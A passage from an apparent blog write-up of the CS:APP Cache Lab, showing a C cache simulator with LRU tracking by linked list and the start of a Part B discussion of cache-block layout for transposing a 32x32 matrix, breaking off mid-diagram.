class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;getopt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">"cachelab.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Should avoid global variables. For simplicity here.</span></span><br><span class="line"><span class="type">int</span> hit_count = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> miss_count = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> eviction_count = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> verbose = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> help_msgs = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> t = <span class="number">0</span>, s = <span class="number">0</span>, set_num = <span class="number">0</span>, E = <span class="number">0</span>, b = <span class="number">0</span>, block_size = <span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> offset_mask = <span class="number">0</span>, set_mask = <span class="number">0</span>, check_mask = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">lru_node</span> <span class="type">lru_node_t</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">lru_node</span> {</span><br><span class="line">    <span class="type">int</span> line_number;</span><br><span class="line">    <span class="type">lru_node_t</span>* next;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">cache_line</span> {</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> check_bits;</span><br><span class="line">    <span class="type">char</span>* p_block;</span><br><span class="line">    <span class="type">bool</span> valid;</span><br><span class="line">} <span class="type">cache_line_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">operation_line</span> {</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> address;</span><br><span class="line">    <span class="type">int</span> data_size;</span><br><span class="line">    <span class="type">char</span> op;</span><br><span class="line">} <span class="type">operation_line_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print_help_msgs</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Usage: ./csim [hv] -s &lt;num&gt; -E &lt;num&gt; -b &lt;num&gt; -t &lt;file&gt;\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Options:\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"  -h         Print this help message.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"  -v         Optional verbose flag.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"  -s &lt;num&gt;   Number of set index bits.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"  -E &lt;num&gt;   Number of lines per set.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"  -b &lt;num&gt;   Number of block offset bits.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"  -t &lt;file&gt;  Trace file.\n\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Examples:\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"  linux&gt;  ./csim -s 4 -E 1 -b 4 -t traces/yi.trace\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"  linux&gt;  ./csim -v -s 8 -E 2 -b 4 -t traces/yi.trace\n"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">operation_line_t</span> <span class="title">parse_line</span><span class="params">(<span class="type">char</span>* line)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="type">operation_line_t</span> operation_line;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> start_index, end_index;</span><br><span class="line">    <span class="type">char</span> str_address[<span class="number">128</span>];</span><br><span class="line">    <span class="type">char</span> str_size[<span class="number">16</span>];</span><br><span class="line">    <span class="type">char</span>* end = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(line[<span class="number">0</span>] == <span class="string">'I'</span>) </span><br><span class="line">    {</span><br><span class="line">        operation_line.op = <span class="string">'I'</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">        operation_line.op = line[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">        start_index = end_index = <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">while</span> (line[end_index] != <span class="string">','</span>) </span><br><span class="line">        {</span><br><span class="line">            ++end_index;</span><br><span class="line">        }</span><br><span class="line">        <span class="built_in">strncpy</span>(str_address, line + start_index, end_index - start_index);</span><br><span class="line">        str_address[end_index - start_index] = <span class="string">'\0'</span>;</span><br><span class="line">        operation_line.address = <span class="built_in">strtoul</span>(str_address, &amp;end, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">        start_index = end_index + <span class="number">1</span>;</span><br><span class="line">        end_index = start_index + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="built_in">isdigit</span>(line[end_index])) </span><br><span class="line">        {</span><br><span class="line">            ++end_index;</span><br><span class="line">        }</span><br><span class="line">        <span class="built_in">strncpy</span>(str_size, line + start_index, end_index - start_index);</span><br><span class="line">        str_size[end_index - start_index] = <span class="string">'\0'</span>;</span><br><span class="line">        operation_line.data_size = <span class="built_in">atoi</span>(str_size);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> operation_line;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find_lru_index</span><span class="params">(<span class="type">lru_node_t</span>* root)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">while</span> (root-&gt;next != <span class="literal">NULL</span>)</span><br><span class="line">    {</span><br><span class="line">        root = root-&gt;next;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> root-&gt;line_number;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">lru_node_t</span>* <span class="title">create_node</span><span class="params">(<span class="type">lru_node_t</span>* root, <span class="type">int</span> used_index)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="type">lru_node_t</span>* new_node = <span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(<span class="type">lru_node_t</span>));</span><br><span class="line">    new_node-&gt;line_number = used_index;</span><br><span class="line">    new_node-&gt;next = root-&gt;next;</span><br><span class="line">    root-&gt;next = new_node;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> new_node;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">lru_node_t</span>* <span class="title">find_node_with_index</span><span class="params">(<span class="type">lru_node_t</span>* root, <span class="type">int</span> used_index, <span class="type">lru_node_t</span>** prev_node)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="comment">// Start with the real rool node</span></span><br><span class="line">    root = root-&gt;next;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (root != <span class="literal">NULL</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;line_number == used_index)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        {</span><br><span class="line">            *prev_node = root;</span><br><span class="line">            root = root-&gt;next;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">update_lru_node</span><span class="params">(<span class="type">lru_node_t</span>* root, <span class="type">int</span> used_index)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="literal">NULL</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">create_node</span>(root, used_index);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 1). Don't forget to set the previous node's next</span></span><br><span class="line">    <span class="type">lru_node_t</span>* prev_node = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">lru_node_t</span>* found_node = <span class="built_in">find_node_with_index</span>(root, used_index, &amp;prev_node);</span><br><span class="line">    <span class="keyword">if</span> (found_node != <span class="literal">NULL</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span> (prev_node != <span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            prev_node-&gt;next = found_node-&gt;next;</span><br><span class="line">        }</span><br><span class="line">        <span class="comment">// 2). Be careful when root's next is the found node</span></span><br><span class="line">        found_node-&gt;next = (root-&gt;next == found_node ? found_node-&gt;next : root-&gt;next);</span><br><span class="line">        root-&gt;next = found_node;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">create_node</span>(root, used_index);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">cache_operation</span><span class="params">(<span class="type">operation_line_t</span>* operation, <span class="type">char</span>* line, <span class="type">cache_line_t</span>** cache_decay, <span class="type">lru_node_t</span>* lru_roots)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    line[<span class="built_in">strlen</span>(line) - <span class="number">1</span>] = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> op = operation-&gt;op;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> address = operation-&gt;address;</span><br><span class="line">    <span class="type">int</span> set = (address &amp; set_mask) &gt;&gt; b;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> check = ((address &amp; check_mask) &gt;&gt; (s + b)) &amp; ((<span class="number">1</span> &lt;&lt; (s + b)) - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cache_line_t</span> (*cache)[E] = (<span class="built_in">cache_line_t</span>(*)[E]) cache_decay;</span><br><span class="line">    <span class="type">cache_line_t</span>* cache_set = cache[set];</span><br><span class="line"></span><br><span class="line">    <span class="type">bool</span> b_hit = <span class="literal">false</span>;</span><br><span class="line">    <span class="type">int</span> placement_or_hit_index = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; E; ++i)</span><br><span class="line">    {</span><br><span class="line">        <span class="comment">// Cache hit</span></span><br><span class="line">        <span class="keyword">if</span> (cache_set[i].valid &amp;&amp; cache_set[i].check_bits == check)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">if</span> (op == <span class="string">'M'</span>)</span><br><span class="line">            {</span><br><span class="line">                <span class="keyword">if</span> (verbose) {</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"%s hit hit\n"</span>, line);</span><br><span class="line">                }</span><br><span class="line">                hit_count += <span class="number">2</span>;</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">            {</span><br><span class="line">                <span class="keyword">if</span> (verbose) {</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"%s hit\n"</span>, line);</span><br><span class="line">                }</span><br><span class="line">                ++hit_count;</span><br><span class="line">            }</span><br><span class="line">            </span><br><span class="line">            placement_or_hit_index = i;</span><br><span class="line">            b_hit = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="comment">// Empty line</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (!cache_set[i].valid)</span><br><span class="line">        {</span><br><span class="line">            placement_or_hit_index = i;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Cache miss, do placement or eviction</span></span><br><span class="line">    <span class="keyword">if</span> (!b_hit)</span><br><span class="line">    {</span><br><span class="line">        <span class="comment">// Has empty line, do placement</span></span><br><span class="line">        <span class="keyword">if</span> (placement_or_hit_index != <span class="number">-1</span>)</span><br><span class="line">        {</span><br><span class="line">            cache_set[placement_or_hit_index].valid = <span class="literal">true</span>;</span><br><span class="line">            cache_set[placement_or_hit_index].check_bits = check;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (op == <span class="string">'M'</span>)</span><br><span class="line">            {</span><br><span class="line">                <span class="keyword">if</span> (verbose) {</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"%s miss hit\n"</span>, line);</span><br><span class="line">                }</span><br><span class="line">                ++miss_count;</span><br><span class="line">                ++hit_count;</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            {</span><br><span class="line">                <span class="keyword">if</span> (verbose) {</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"%s miss\n"</span>, line);</span><br><span class="line">                }</span><br><span class="line">                ++miss_count;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="comment">// All lines are occupied, do eviction</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        {</span><br><span class="line">            placement_or_hit_index = <span class="built_in">find_lru_index</span>(&amp;lru_roots[set]);</span><br><span class="line">            cache_set[placement_or_hit_index].check_bits = check;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (op == <span class="string">'M'</span>)</span><br><span class="line">            {</span><br><span class="line">                <span class="keyword">if</span> (verbose) {</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"%s miss eviction hit\n"</span>, line);</span><br><span class="line">                }</span><br><span class="line">                ++miss_count;</span><br><span class="line">                ++eviction_count;</span><br><span class="line">                ++hit_count;</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            {</span><br><span class="line">                <span class="keyword">if</span> (verbose) {</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"%s miss eviction\n"</span>, line);</span><br><span class="line">                }</span><br><span class="line">                ++miss_count;</span><br><span class="line">                ++eviction_count;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">update_lru_node</span>(&amp;lru_roots[set], placement_or_hit_index);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="comment">// Parse input arguments</span></span><br><span class="line">    <span class="type">int</span> opt;</span><br><span class="line">    <span class="type">char</span>* trace_file;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ((opt = <span class="built_in">getopt</span>(argc, argv, <span class="string">"hvs:E:b:t:"</span>)) != <span class="number">-1</span>) {</span><br><span class="line">        <span class="keyword">switch</span> (opt) {</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'h'</span>: </span><br><span class="line">                help_msgs = <span class="number">1</span>; </span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'v'</span>: </span><br><span class="line">                verbose = <span class="number">1</span>; </span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'s'</span>:</span><br><span class="line">                s = <span class="built_in">atoi</span>(optarg);</span><br><span class="line">                set_num = <span class="number">1</span> &lt;&lt; s;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'E'</span>:</span><br><span class="line">                E = <span class="built_in">atoi</span>(optarg);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'b'</span>:</span><br><span class="line">                b = <span class="built_in">atoi</span>(optarg);</span><br><span class="line">                block_size = <span class="number">1</span> &lt;&lt; b;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'t'</span>:</span><br><span class="line">                trace_file = optarg;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Invalid arguments!"</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (help_msgs)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">print_help_msgs</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (s &lt;= <span class="number">0</span> || E &lt;= <span class="number">0</span> || b &lt;= <span class="number">0</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Invalid argument values!\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Compute other global variables</span></span><br><span class="line">    t = <span class="number">64</span> - s - b;</span><br><span class="line">    offset_mask = (<span class="number">1</span> &lt;&lt; b) - <span class="number">1</span>;</span><br><span class="line">    set_mask = (<span class="number">1</span> &lt;&lt; (s + b)) - <span class="number">1</span> - offset_mask;</span><br><span class="line">    check_mask = -(<span class="number">1</span> &lt;&lt; (s + b));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Allocate memory for cache</span></span><br><span class="line">    <span class="type">lru_node_t</span>* lru_roots = <span class="built_in">calloc</span>(set_num, <span class="built_in">sizeof</span>(<span class="type">lru_node_t</span>));</span><br><span class="line">    <span class="built_in">cache_line_t</span> (*cache)[E] = <span class="built_in">calloc</span>(set_num, <span class="built_in">sizeof</span>(<span class="type">cache_line_t</span>) * E);</span><br><span class="line">    <span class="type">char</span>* p_cache_space = <span class="built_in">malloc</span>(block_size * set_num * E);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; set_num; ++i)</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; E; ++j)</span><br><span class="line">        {</span><br><span class="line">            cache[i][j].p_block = p_cache_space + i * (block_size * E) + j * block_size;</span><br><span class="line">        }</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Read file and process by line</span></span><br><span class="line">    FILE* file = <span class="built_in">fopen</span>(trace_file, <span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">NULL</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Cannot open file %s\n"</span>, trace_file);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="type">char</span> line[<span class="number">128</span>];</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">fgets</span>(line, <span class="number">128</span>, file))</span><br><span class="line">    {</span><br><span class="line">        <span class="type">operation_line_t</span> operation = <span class="built_in">parse_line</span>(line);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">switch</span> (operation.op)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'L'</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'S'</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'M'</span>:</span><br><span class="line">                <span class="built_in">cache_operation</span>(&amp;operation, line, (<span class="type">cache_line_t</span>**)cache, lru_roots);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Print summary and clean up memory</span></span><br><span class="line">    <span class="built_in">printSummary</span>(hit_count, miss_count, eviction_count);</span><br><span class="line">    <span class="built_in">free</span>(cache);</span><br><span class="line">    <span class="built_in">free</span>(p_cache_space);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>One thing you should be very careful about is when we update the LRU
linked list. By the way, I was wondering if there is a simpler method to
implement LRU? Linked list seems to result in memory and time
overhead.</p>
<p><strong>Part B</strong></p>
<p>This the the hardest one so far! But take it easy and think about it
step by step.</p>
<p>For a given 32*32 matrix, each row of it has four sequential blocks
in cache because each cache block contains 8 integers (32 bytes) and
each row of the matrix has 4 sets of 8 integers. The cache layout for
the matrix is shown as below:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"> -------------------</span><br><span class="line">| 0  | 1  | 2  | 3  |  row 1</span><br><span class="line"> -------------------</span><br><span class="line">| 4  | 5  | 6  | 7  |  row 2</span><br><span class="line"> -------------------</span><br><span class="line">| 8  | 9  | 10 | 11 |  row 3</span><br><span class="line"> -------------------</span><br><span class="line">| 12 | 13 | 14 | 15 |  row 4</span><br><span class="line"> -------------------</span><br><span class="line">| 16 | 17 | 18 | 19 |  row 5</span><br><span class="line"> -------------------</span><br><span class="line">| 20 | 21 | 22 | 23 |  row 6</span><br><span class="line"> -------------------</span><br><span class="line">| 24 | 25 | 26 | 27 |  row 7</span><br><span class="line"> -------------------</span><br><span class="line">| 28 | 29 | 30 | 31 |  row 8</span><br><span class="line"> -------------------</span><br><span class="line">| 0  | 1  | 2  | 3  |  row 9</span><br><span class="line"> -------------------</span><br><span class="line">| 4  | 5  | 6  | 7  |  row 10</span><br><span class="line"> -------------------</span><br><span class="line">| 8  | 9  | 10 | 11 |  row 11</span><br><span class="line"> -------------------</span><br><span class="line">| 12 | 13 | 14 | 15 |  row 12</span><br><span class="line"> -------------------</span><br><span class="line">| 16 | 17 | 18 | 19 |  row 13</span><br><span class="line"> -------------------</span><br><span class="line">| 20 | 21 | 22 | 23 |  row 14</span><br><span class="line"> -------------------</span><br><span class="line">| 24 | 25 | 26 | 27 |  row 15</span><br><span class="line"> -------------------</span><br><span class="line">| 28 | 29 | 30 | 31 |  row 16</span><br><span class="line"> -------------------</span><br><span class="line">| 0  | 1  | 2  | 3  |  row 17</span><br><span class="line"> -------------------</span><br><span class="line">| 4  | 5  | 6  | 7  |  row 18</span><br><span class="line"> -------------------</span><br><span class="line">| 8  | 9  | 10 | 11 |  row 19</span><br><span class="line"> -------------------</span><br><span class="line">| 12 | 13 | 14 | 15 |  row 20</span><br><span class="line"> -------------------</span><br><span class="line">| 16 | 17 | 18 | 19 |  row 21</span><br><span class="line"> -------------------</span><br><span class="line">| 20 | 21 | 22 | 23 |  row 22</span><br><span class="line"> -------------------</span><br><span class="line">| 24 | 25 | 26 | 27 |  row 23</span><br><span class="line"> -------------------</span><br><span class="line">| 28 | 29 | 30 | 31 |  row 24</span><br><span class="line"> -------------------</span><br><span class="line">| 0  | 1  | 2  | 3  |  row 25</span><br><span class="line"> -------------------</span><br><span class="line">| 4  | 5  | 6  | 7  |  row 26</span><br><span class="line"> -------------------</span><br><span class="line">| 8  | 9  | 10 | 11 |  row 27</span><br><span class="line"> -------------------</span><br><span class="line">| 12 | 13 | 14 | 15 |  row 28</span><br><span class="line"> -------------------</span><br><span class="line">| 16 | 17 | 18 | 19 |  row 